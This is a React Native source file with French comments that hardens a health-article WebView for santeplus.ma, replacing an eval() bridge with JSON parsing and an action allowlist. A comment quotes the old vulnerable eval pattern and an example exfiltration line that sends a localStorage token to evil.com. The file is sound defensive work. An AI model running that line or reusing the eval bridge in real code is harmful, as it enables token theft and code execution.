/**
 * src/screens/ArticleScreen.tsx
 *
 * WebView durcie pour l'affichage d'articles de santé.
 *
 * ═══════════════════════════════════════════════════════════════
 * MENACES COUVERTES :
 * ═══════════════════════════════════════════════════════════════
 *
 * M4 — Insufficient Input/Output Validation :
 *   AVANT : onMessage={(e) => eval(e.nativeEvent.data)}
 *     → eval() exécute N'IMPORTE QUEL code JS reçu de la WebView
 *     → Un attaquant injecte du code via XSS ou MitM et obtient
 *       une exécution de code arbitraire (RCE)
 *   APRÈS : JSON.parse + liste blanche d'actions autorisées
 *     → Seules les actions connues sont traitées
 *     → Le JSON malformé est silencieusement ignoré
 *
 * M8 — Security Misconfiguration :
 *   AVANT : originWhitelist={["*"]}
 *     → La WebView charge N'IMPORTE QUEL domaine (phishing, malware)
 *   APRÈS : originWhitelist={["https://santeplus.ma"]}
 *     → Seul notre domaine HTTPS est autorisé
 *
 * SUPPLÉMENTAIRE :
 *   - Validation de l'URL AVANT chargement (isUrlAllowed)
 *   - Interception de chaque navigation (onShouldStartLoadWithRequest)
 *   - Désactivation de l'accès aux fichiers locaux (allowFileAccess=false)
 * ═══════════════════════════════════════════════════════════════
 */

import React, { useCallback, useRef } from "react";
import {
  View,
  Text,
  StyleSheet,
  ActivityIndicator,
  Alert,
} from "react-native";
import { WebView, WebViewNavigation } from "react-native-webview";

// ═══════════════════════════════════════════════════════════════
// LISTE BLANCHE D'ACTIONS (ALLOWLIST)
// ═══════════════════════════════════════════════════════════════
// Seules ces actions sont acceptées via le pont onMessage.
// Toute action non listée est SILENCIEUSEMENT IGNORÉE.
// C'est le remplaçant sécurisé de eval() :
//
//   eval() = "exécute tout ce qu'on me donne" → RCE
//   allowlist = "je ne traite que ce que je connais" → sécurisé
//
// Pour ajouter une nouvelle action, il faut :
// 1. L'ajouter ici dans ALLOWED_ACTIONS
// 2. Ajouter le case dans le switch handleMessage
// → Toute action oubliée ici est automatiquement bloquée
// ═══════════════════════════════════════════════════════════════
const ALLOWED_ACTIONS = [
  "ARTICLE_LOADED",   // L'article a fini de se charger
  "SHARE_ARTICLE",    // L'utilisateur veut partager l'article
  "ARTICLE_ERROR",    // Erreur de chargement de l'article
] as const;

type AllowedAction = (typeof ALLOWED_ACTIONS)[number];

// ── Domaine autorisé ──────────────────────────────────────────
const ALLOWED_DOMAIN = "santeplus.ma";

interface ArticleScreenProps {
  route: {
    params: {
      articleUrl: string;
    };
  };
}

export default function ArticleScreen({ route }: ArticleScreenProps) {
  const webViewRef = useRef<WebView>(null);
  const { articleUrl } = route.params;

  // ═══════════════════════════════════════════════════════════
  // VALIDATION DE L'URL AVANT CHARGEMENT
  // ═══════════════════════════════════════════════════════════
  // L'URL vient de route.params.articleUrl, qui peut être
  // manipulée via un deep link ou une API compromise.
  // On vérifie qu'elle pointe vers notre domaine HTTPS.
  const isUrlAllowed = useCallback((url: string): boolean => {
    try {
      const parsed = new URL(url);
      return (
        parsed.protocol === "https:" &&
        (parsed.hostname === ALLOWED_DOMAIN ||
          parsed.hostname.endsWith(`.${ALLOWED_DOMAIN}`))
      );
    } catch {
      return false; // URL malformée → refusée
    }
  }, []);

  // ═══════════════════════════════════════════════════════════
  // INTERCEPTION DE CHAQUE NAVIGATION DANS LA WEBVIEW
  // ═══════════════════════════════════════════════════════════
  // Même si l'URL initiale est valide, le contenu web pourrait
  // contenir des liens vers des domaines malveillants.
  // Cette fonction est appelée AVANT chaque navigation.
  const handleNavigationRequest = useCallback(
    (request: WebViewNavigation): boolean => {
      if (!isUrlAllowed(request.url)) {
        if (__DEV__) {
          console.warn(`[WebView] ⛔ Navigation bloquée : ${request.url}`);
        }
        Alert.alert(
          "Navigation bloquée",
          "Ce lien pointe vers un domaine non autorisé."
        );
        return false; // BLOQUE la navigation
      }
      return true; // AUTORISE la navigation
    },
    [isUrlAllowed]
  );

  // ═══════════════════════════════════════════════════════════
  // PONT DE COMMUNICATION SÉCURISÉ (REMPLACE eval())
  // ═══════════════════════════════════════════════════════════
  //
  // AVANT (DANGEREUX) :
  //   onMessage={(e) => eval(e.nativeEvent.data)}
  //   → eval() exécute n'importe quel code JavaScript :
  //     eval('fetch("https://evil.com?token="+localStorage.token)')
  //     → Exfiltration de données vers un serveur attaquant
  //
  // APRÈS (SÉCURISÉ) :
  //   1. JSON.parse() → on attend un objet structuré, pas du code
  //   2. Vérification allowlist → seules les actions connues passent
  //   3. Switch/case → traitement déterministe, pas d'exécution dynamique
  //
  // Côté web (dans l'article HTML), le code envoie :
  //   window.ReactNativeWebView.postMessage(JSON.stringify({
  //     type: "ARTICLE_LOADED",
  //     payload: { title: "Conseils nutrition", readTime: 5 }
  //   }));
  //
  const handleMessage = useCallback(
    (event: { nativeEvent: { data: string } }) => {
      // ── Étape 1 : Parser le JSON de manière sécurisée ──────
      let message: { type?: string; payload?: unknown };
      try {
        message = JSON.parse(event.nativeEvent.data);
      } catch {
        // Le message n'est pas du JSON valide → on l'ignore
        // Un attaquant qui envoie du code JS brut est bloqué ici
        if (__DEV__) {
          console.warn("[WebView] Message non-JSON ignoré");
        }
        return;
      }

      // ── Étape 2 : Vérifier la liste blanche ───────────────
      if (
        !message.type ||
        !(ALLOWED_ACTIONS as readonly string[]).includes(message.type)
      ) {
        if (__DEV__) {
          console.warn(`[WebView] Action non autorisée : ${message.type}`);
        }
        return; // Action inconnue → ignorée silencieusement
      }

      // ── Étape 3 : Traiter les actions connues ─────────────
      switch (message.type as AllowedAction) {
        case "ARTICLE_LOADED":
          if (__DEV__) console.log("[WebView] ✅ Article chargé");
          break;

        case "SHARE_ARTICLE":
          if (__DEV__) console.log("[WebView] 📤 Partage demandé");
          // En production : utiliser expo-sharing ou Share API native
          break;

        case "ARTICLE_ERROR":
          Alert.alert("Erreur", "L'article n'a pas pu être chargé.");
          break;
      }
    },
    []
  );

  // ── Écran d'erreur si l'URL initiale est invalide ──────────
  if (!isUrlAllowed(articleUrl)) {
    return (
      <View style={styles.errorContainer}>
        <Text style={styles.errorIcon}>⚠️</Text>
        <Text style={styles.errorText}>
          URL non autorisée.{"\n"}
          Seul le domaine santeplus.ma est accepté.
        </Text>
      </View>
    );
  }

  return (
    <WebView
      ref={webViewRef}
      source={{ uri: articleUrl }}
      javaScriptEnabled={true}
      // ═══════════════════════════════════════════════════════
      // CORRECTION CRITIQUE : originWhitelist
      // ═══════════════════════════════════════════════════════
      // AVANT : ["*"] → autorise TOUT domaine (phishing, malware)
      // APRÈS : ["https://santeplus.ma"] → UNIQUEMENT notre domaine
      originWhitelist={["https://santeplus.ma"]}
      // ── Pont sécurisé (remplace eval) ──
      onMessage={handleMessage}
      // ── Interception des navigations ──
      onShouldStartLoadWithRequest={handleNavigationRequest}
      // ── Indicateur de chargement ──
      startInLoadingState={true}
      renderLoading={() => (
        <View style={styles.loadingContainer}>
          <ActivityIndicator size="large" color="#2E86AB" />
        </View>
      )}
      // ── Sécurité supplémentaire ──
      allowFileAccess={false}          // Pas d'accès aux fichiers locaux
      allowUniversalAccessFromFileURLs={false}
      domStorageEnabled={false}         // Pas de localStorage dans la WebView
      scalesPageToFit={false}           // Protection clickjacking
    />
  );
}

const styles = StyleSheet.create({
  loadingContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
  },
  errorContainer: {
    flex: 1,
    justifyContent: "center",
    alignItems: "center",
    padding: 32,
    backgroundColor: "#FFF3E0",
  },
  errorIcon: {
    fontSize: 48,
    marginBottom: 16,
  },
  errorText: {
    fontSize: 16,
    color: "#E65100",
    textAlign: "center",
    lineHeight: 24,
  },
});

